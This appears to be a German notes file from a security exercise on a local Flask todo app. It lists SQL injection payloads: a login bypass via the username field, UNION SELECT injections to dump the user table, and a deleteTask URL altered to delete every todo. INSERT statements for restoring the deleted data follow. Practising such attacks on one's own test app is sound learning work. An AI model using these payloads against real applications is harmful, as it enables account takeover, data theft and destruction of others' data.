
# Injections:
## Login:
    # Beim username folgendes eingeben: ' OR id = 1; -- 
    # Passwort mit mehr als 3 Zeichen befüllen und go :)
    # Anmeldung erfolgt mit dem user, welcher die eingetragene ID hat

# Union SELECT:
## /tasks Projectname=
    # ' UNION SELECT "888 UNION SELECT * FROM user"; --%20
    # ' UNION SELECT "888 UNION SELECT * FROM user"; --%20

## deleteTask:
    # Sagen wir ich habe diesen Link: http://127.0.0.1:8099/deleteTask?todo_id=25
    # Ich könnte das draus machen: http://127.0.0.1:8099/deleteTask?todo_id=1 OR description IS NOT NULL; -- 

# Zum Todos wiederherstellen:
#INSERT INTO todo (id, description, due_date, project_id, is_completed) VALUES (1, 'Build a Flask app', '2024-05-01 00:00:00', 1, 0);
#INSERT INTO todo (id, description, due_date, project_id, is_completed) VALUES (2, 'Finalize project scope', '2024-04-15 00:00:00', 1, 0);
#INSERT INTO todo (id, description, due_date, project_id, is_completed) VALUES (4, 'Implement authentication system', '2024-04-25 00:00:00', 1, 0);
#INSERT INTO todo (id, description, due_date, project_id, is_completed) VALUES (5, 'Develop the user profile section', '2024-05-05 00:00:00', 1, 0);
#INSERT INTO todo (id, description, due_date, project_id, is_completed) VALUES (6, 'Setup database backups', '2024-05-10 00:00:00', 1, 0);
#INSERT INTO todo (id, description, due_date, project_id, is_completed) VALUES (7, 'Run user acceptance testing', '2024-05-15 00:00:00', 1, 0);
#INSERT INTO todo (id, description, due_date, project_id, is_completed) VALUES (8, 'Deploy the application to production', '2024-05-20 00:00:00', 1, 0);
#INSERT INTO todo (id, description, due_date, project_id, is_completed) VALUES (9, 'Conduct post-launch review meeting', '2024-05-25 00:00:00', 4, 0);
#INSERT INTO todo (id, description, due_date, project_id, is_completed) VALUES (10, 'Salat', NULL, 3, 0);
#INSERT INTO todo (id, description, due_date, project_id, is_completed) VALUES (16, 'asdasd', '2024-04-27 19:00:00', 3, 0);
#INSERT INTO todo (id, description, due_date, project_id, is_completed) VALUES (18, 'test', NULL, 2, 0);
#INSERT INTO todo (id, description, due_date, project_id, is_completed) VALUES (23, 'alio', NULL, 4, 0);
#INSERT INTO todo (id, description, due_date, project_id, is_completed) VALUES (24, 'hehe', NULL, 99, 0);
#INSERT INTO todo (id, description, due_date, project_id, is_completed) VALUES (25, 'hehe2', NULL, 99, 0);
#INSERT INTO todo (id, description, due_date, project_id, is_completed) VALUES (26, 'testserfsdf', NULL, 3, 0);
#INSERT INTO todo (id, description, due_date, project_id, is_completed) VALUES (27, 'sdfsdf', '2024-04-30 15:14:00', 3, 0);
#INSERT INTO todo (id, description, due_date, project_id, is_completed) VALUES (28, 'asdasd', NULL, 4, 0);
#INSERT INTO todo (id, description, due_date, project_id, is_completed) VALUES (29, 'asdasd', NULL, 2, 0);
